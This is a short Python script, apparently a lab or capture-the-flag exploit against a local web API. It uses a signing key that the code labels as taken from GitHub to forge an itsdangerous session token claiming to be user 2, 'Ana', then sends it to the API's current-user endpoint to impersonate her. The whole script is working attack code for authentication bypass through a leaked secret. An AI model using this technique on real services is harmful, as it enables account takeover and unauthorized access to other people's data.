import requests
from itsdangerous import URLSafeTimedSerializer

URL = "http://localhost:8080/api/v1"
KEY_DE_GITHUB = "9Fci0ixnVg4ApGVuklJyjStCrlYbq5cqH0OICTwUD4s"

falso = URLSafeTimedSerializer(KEY_DE_GITHUB).dumps({"userId": 2, "username": "Ana"})
r = requests.get(f"{URL}/users/current", headers={"Token": falso})

print(r.status_code, r.text)